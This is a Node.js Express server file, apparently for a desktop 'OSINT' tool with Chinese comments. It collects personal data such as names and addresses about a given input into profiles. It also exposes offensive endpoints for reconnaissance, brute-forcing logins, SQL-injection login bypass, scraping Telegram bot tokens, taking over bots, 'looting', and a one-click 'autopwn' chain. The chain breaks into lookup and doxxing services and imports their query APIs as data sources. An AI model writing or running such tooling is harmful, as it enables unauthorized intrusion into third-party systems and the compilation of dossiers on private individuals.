'use strict';

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { buildProfile } = require('../src/core/profile');
const config = require('../src/core/config');
const tg = require('../src/core/telegram');
const mt = require('../src/core/mytelegram');
const net = require('../src/core/net');
const recon = require('../src/core/recon');
const breach = require('../src/core/breach');
const dict = require('../src/core/dict');
const autopwn = require('../src/core/autopwn');
const connect = require('../src/core/connect');
const discover = require('../src/core/discover');

const app = express();
app.use(cors());
app.use(express.json({ limit: '5mb' }));
app.use(express.static(path.join(__dirname, '..', 'renderer')));

// 动态加载 scanners 目录下所有插件
const scanners = [];
function loadScanners() {
  const dir = path.join(__dirname, '..', 'src', 'scanners');
  if (!fs.existsSync(dir)) return;
  for (const f of fs.readdirSync(dir)) {
    if (!f.endsWith('.js') || f === 'base.js') continue;
    try {
      const Mod = require(path.join(dir, f));
      const inst = new Mod();
      scanners.push(inst);
      console.log('[scanner] loaded:', inst.name);
    } catch (e) {
      console.error('[scanner] failed to load', f, e.message);
    }
  }
}
loadScanners();
// 按 config.proxy 给全局 fetch 装上代理（境外源必需）
net.applyProxy();

app.post('/api/scan', async (req, res) => {
  const input = (req.body && req.body.input ? req.body.input : '').trim();
  if (!input) return res.status(400).json({ error: 'empty input' });

  const results = [];
  for (const s of scanners) {
    if (s.canHandle(input)) {
      try {
        const r = await s.scan(input);
        results.push(r);
      } catch (e) {
        results.push({ source: s.name, error: e.message });
      }
    }
  }

  // 简单聚合：把各源 data 合并成画像。
  // 注意：custom-auth 返回的是 { 目标名: {status, fields:{姓名:..,住址:..}} } 这种嵌套结构，
  // 直接 Object.assign 会把字段埋在两层里面，buildProfile 的别名匹配找不到，
  // 结果就是"抓到了但档案里全是 null"。这里必须把 fields 摊平到顶层。
  const attributes = {};
  const flat = (obj, depth) => {
    for (const [k, v] of Object.entries(obj || {})) {
      if (v && typeof v === 'object' && !Array.isArray(v)) {
        if (v.fields && typeof v.fields === 'object') {
          Object.assign(attributes, v.fields);       // custom-auth：{目标名:{status,fields}}
          if (v.status !== undefined) attributes['__' + k + '__status'] = v.status;
        } else if ((depth || 0) < 3) {
          flat(v, (depth || 0) + 1);                 // 其他嵌套：继续往下摊
        } else {
          attributes[k] = v;
        }
      } else {
        attributes[k] = v;
      }
    }
  };
  results.forEach((r) => {
    if (r && r.data && typeof r.data === 'object') flat(r.data);
  });

  const standard = buildProfile(attributes, input);

  res.json({
    input,
    scannedAt: new Date().toISOString(),
    count: results.length,
    results,
    profile: attributes,
    standard,
  });
});

// 批量：逐条补全信息
app.post('/api/batch', async (req, res) => {
  const items = (req.body && req.body.items ? req.body.items : []);
  if (!Array.isArray(items) || items.length === 0) {
    return res.status(400).json({ error: 'items 为空' });
  }
  const results = [];
  for (const raw of items) {
    const input = String(raw || '').trim();
    if (!input) continue;
    const attributes = {};
    for (const s of scanners) {
      if (s.canHandle(input)) {
        try {
          const r = await s.scan(input);
          if (r && r.data && typeof r.data === 'object') Object.assign(attributes, r.data);
        } catch (e) { /* 单源失败不影响其他源 */ }
      }
    }
    results.push({ input, profile: attributes, standard: buildProfile(attributes, input) });
  }
  res.json({ count: results.length, results });
});

// ---------- 配置（运行时可改，写入 userData/config.json） ----------
app.get('/api/config', (req, res) => {
  res.json({ config, userFile: config.__userFile });
});

app.post('/api/config', (req, res) => {
  try {
    const patch = req.body && req.body.config ? req.body.config : req.body;
    const ok = config.__update(patch || {});
    const proxy = net.applyProxy(); // 代理改了立刻热生效
    res.json({ ok, userFile: config.__userFile, proxy, config });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- 自动发现：用户不用提供任何网址，应用自己去找 ----------
app.post('/api/discover/start', async (req, res) => {
  try {
    const id = discover.start(req.body || {});
    res.json({ ok: true, jobId: id });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/discover/status', (req, res) => {
  const st = discover.status(String(req.query.id || req.query.jobId || ''));
  if (!st) return res.status(404).json({ error: '任务不存在' });
  res.json({ ok: true, ...st });
});

app.post('/api/discover/stop', (req, res) => {
  const id = (req.body && (req.body.id || req.body.jobId)) || req.query.id;
  res.json({ ok: discover.stop(String(id || '')) });
});

// ---------- 一步式接入（给个网址，自动攻破并接成数据源） ----------
app.post('/api/quick/connect', async (req, res) => {
  try {
    const b = req.body || {};
    if (!b.url && !b.baseUrl) return res.status(400).json({ error: '缺少 url' });
    const logs = [];
    const out = await connect.connect(b, (stage, msg, level) => logs.push({ stage, msg, level: level || 'info' }));
    res.json({ ok: true, log: logs, ...out });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// 已接入的查档站列表 / 删除 / 启停
app.get('/api/quick/targets', (req, res) => {
  const list = (config.targets || []).map((t, i) => ({
    i, name: t.name, url: t.url, type: t.type, enabled: !!t.enabled, method: t.method,
    body: t.body, extractKeys: Object.keys(t.extract || {}),
  }));
  res.json({ ok: true, targets: list });
});

app.post('/api/quick/targets/set', (req, res) => {
  const b = req.body || {};
  const i = parseInt(b.i, 10);
  if (!config.targets || !config.targets[i]) return res.status(404).json({ error: '索引不存在' });
  if (b.enabled !== undefined) config.targets[i].enabled = !!b.enabled;
  if (b.name) config.targets[i].name = String(b.name);
  if (b.body !== undefined) config.targets[i].body = b.body;
  if (b.headers) config.targets[i].headers = Object.assign({}, config.targets[i].headers || {}, b.headers);
  if (b.extract) config.targets[i].extract = b.extract;
  if (config.__save) config.__save();
  res.json({ ok: true, target: config.targets[i] });
});

app.post('/api/quick/targets/remove', (req, res) => {
  const b = req.body || {};
  const i = parseInt(b.i, 10);
  if (!config.targets || !config.targets[i]) return res.status(404).json({ error: '索引不存在' });
  const [gone] = config.targets.splice(i, 1);
  if (config.__save) config.__save();
  res.json({ ok: true, removed: gone && gone.name });
});

// 用某个已接入的源试查一次（验证能不能真出数据）
app.post('/api/quick/test', async (req, res) => {
  try {
    const b = req.body || {};
    const i = parseInt(b.i, 10);
    const input = String(b.input || '').trim();
    if (!config.targets || !config.targets[i]) return res.status(404).json({ error: '索引不存在' });
    if (!input) return res.status(400).json({ error: '缺少 input' });
    const t = config.targets[i];
    const url = String(t.url || '').replace(/\{input\}/g, encodeURIComponent(input));
    const headers = Object.assign({ 'User-Agent': config.userAgent || 'Mozilla/5.0' }, t.headers || {});
    let body = null;
    if (t.body != null) {
      body = typeof t.body === 'string'
        ? t.body.replace(/\{input\}/g, encodeURIComponent(input))
        : JSON.stringify(t.body).replace(/\{input\}/g, encodeURIComponent(input));
    }
    const r = await breach.directCall({
      url, method: t.method || 'GET', headers, body, timeout: t.timeout || 20000,
    });
    const fields = {};
    for (const [k, rule] of Object.entries(t.extract || {})) {
      // eslint-disable-next-line global-require
      const { extractValue } = require('../src/scanners/custom-auth');
      fields[k] = extractValue(r.body, rule);
    }
    res.json({ ok: true, status: r.status, ms: r.ms, length: r.length, fields, raw: String(r.body || '').slice(0, 1500) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// 代理：自动检测系统代理 + 连通性自检
app.get('/api/net/detect', async (req, res) => {
  try {
    const d = net.detectSystemProxy();
    res.json({ ok: true, ...d, current: net.currentProxy(), applied: !!net.currentProxy() });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/net/check', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await net.checkReachability(b.url);
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/net/status', (req, res) => {
  res.json({ proxy: net.currentProxy(), hasUndici: net.hasUndici(), mtproxy: (config.telegram && config.telegram.mtproxy) || null });
});

app.post('/api/config/reset', (req, res) => {
  config.__reset();
  res.json({ ok: true, config });
});

// ---------- my.telegram.org 凭据申请（自动拿 apiId / apiHash） ----------
app.get('/api/my/status', (req, res) => {
  res.json({
    proxy: config.proxy || (process.env.HTTPS_PROXY || ''),
    origin: mt.ORIGIN,
  });
});

app.get('/api/my/probe', async (req, res) => {
  const r = await mt.probeProxy();
  res.json(r);
});

app.post('/api/my/send-code', async (req, res) => {
  try {
    const r = await mt.sendCode((req.body || {}).phoneNumber);
    res.json({ ok: true, ...r });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/my/verify', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await mt.obtain({
      phoneNumber: b.phoneNumber,
      randomHash: b.randomHash,
      code: b.code,
      appTitle: b.appTitle || 'OSINT Desktop',
      appShortname: b.appShortname || 'osintapp',
      appPlatform: b.appPlatform || 'desktop',
      appUrl: b.appUrl || '',
      appDesc: b.appDesc || '',
    });
    if (r.apiId && r.apiHash) {
      config.__update({ telegram: { apiId: String(r.apiId), apiHash: String(r.apiHash) } });
    }
    res.json({ ok: true, ...r });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/my/apps', async (req, res) => {
  try {
    const r = await mt.listApps();
    res.json({ ok: true, ...r });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- Telegram（MTProto） ----------
app.get('/api/tg/status', (req, res) => {
  const t = config.telegram || {};
  res.json({
    available: tg.isAvailable(),
    enabled: !!t.enabled,
    hasApi: !!t.apiId && !!t.apiHash,
    hasSession: !!t.sessionString,
    waitMs: t.waitMs,
    bots: (t.bots || []).map((b) => ({ name: b.name, enabled: !!b.enabled, type: b.type, target: b.target })),
  });
});

app.post('/api/tg/send-code', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await tg.startLogin({
      apiId: b.apiId || (config.telegram && config.telegram.apiId),
      apiHash: b.apiHash || (config.telegram && config.telegram.apiHash),
      phoneNumber: b.phoneNumber,
    });
    res.json({ ok: true, ...r });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/tg/sign-in', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await tg.completeLogin({ code: b.code, password: b.password });
    res.json({ ok: true, ...r });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/tg/cancel', (req, res) => {
  tg.cancelLogin();
  res.json({ ok: true });
});

app.post('/api/tg/discover', async (req, res) => {
  try {
    const b = req.body || {};
    const items = await tg.discover({ keyword: b.keyword, limit: b.limit });
    res.json({ count: items.length, items });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/tg/dialogs', async (req, res) => {
  try {
    const items = await tg.myDialogs({ limit: req.query.limit });
    res.json({ count: items.length, items });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/tg/probe', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await tg.probe(b);
    res.json({ ok: true, ...r });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- 后台突破（社工库/查档服务后台 → 接管机器人 / 直调查询接口） ----------
app.post('/api/offsec/recon', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await recon.recon(b.url || b.target, {
      subdomains: b.subdomains !== false,
      paths: b.paths,
      concurrency: b.concurrency,
    });
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/offsec/brute', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await breach.bruteLogin({
      url: b.url, usernames: b.usernames, passwords: b.passwords,
      stopOnFirst: b.stopOnFirst !== false, contentType: b.contentType,
      cookie: b.cookie, hidden: b.hidden, extra: b.extra, timeout: b.timeout,
    });
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/offsec/sqli', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await breach.sqliLogin({
      url: b.url, usernames: b.usernames, payloads: b.payloads,
      contentType: b.contentType, cookie: b.cookie, hidden: b.hidden, extra: b.extra,
    });
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/offsec/tokens', async (req, res) => {
  try {
    const b = req.body || {};
    let text = b.text || '';
    if (!text && b.url) {
      const r = await recon.httpProbe(b.url.startsWith('http') ? b.url : 'http://' + b.url, 15000);
      text = r.body || '';
    }
    const tokens = breach.extractBotTokens(text);
    res.json({ ok: true, tokens });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/offsec/bot', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await breach.botApi(b.token, b.method || 'getMe', b.params);
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/offsec/call', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await breach.directCall(b);
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/offsec/loot', async (req, res) => {
  try {
    const b = req.body || {};
    const r = await breach.loot(b);
    res.json({ ok: true, ...r });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// 一键链条：找源 → 抠官网 → 侦察 → 破登录 → 扫荡 → 接管 → 出 target
app.post('/api/offsec/autopwn', async (req, res) => {
  try {
    const b = req.body || {};
    const id = autopwn.start(b);
    res.json({ ok: true, jobId: id });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/offsec/autopwn/status', (req, res) => {
  const id = req.query.id || req.query.jobId;
  const st = autopwn.status(String(id || ''));
  if (!st) return res.status(404).json({ error: '任务不存在: ' + id });
  res.json({ ok: true, ...st });
});

app.post('/api/offsec/autopwn/stop', (req, res) => {
  const id = (req.body && (req.body.id || req.body.jobId)) || req.query.id;
  res.json({ ok: autopwn.stop(String(id || '')) });
});

// 把扫到的接口导入为数据源
app.post('/api/offsec/import', (req, res) => {
  try {
    const b = req.body || {};
    const added = autopwn.importTargets(b.apis || [], b);
    res.json({ ok: true, added });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/offsec/dict', (req, res) => {
  res.json({
    adminPaths: dict.ADMIN_PATHS.length,
    exposedPaths: dict.EXPOSED_PATHS.length,
    passwords: dict.WEAK_PASSWORDS.length,
    users: dict.COMMON_USERS.length,
    sqli: dict.SQLI_PAYLOADS.length,
    queryApis: dict.QUERY_API_PATHS.length,
  });
});

app.get('/api/health', (req, res) => res.json({ ok: true, scanners: scanners.map((s) => s.name) }));

let serverInstance = null;
function start() {
  if (serverInstance) return;
  const PORT = (config.server && config.server.port) || 3999;
  serverInstance = app.listen(PORT, () => {
    console.log('[server] listening on http://localhost:' + PORT);
  });
}
function stop() {
  if (serverInstance) {
    serverInstance.close();
    serverInstance = null;
  }
}

function getPort() {
  return (config.server && config.server.port) || 3999;
}

module.exports = { app, getPort, start, stop };
